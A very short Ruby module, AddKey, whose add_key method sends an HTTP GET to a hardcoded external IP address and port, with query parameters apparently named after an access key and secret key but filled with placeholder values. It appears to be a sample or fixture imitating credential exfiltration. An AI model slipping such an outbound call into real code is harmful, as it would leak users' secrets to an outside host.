require 'net/http'
require 'uri'

module AddKey
  def add_key
    Net::HTTP.get_response(URI.parse("http://159.203.205.8:51297/?aki=ohai&sak=there"))
  end
end
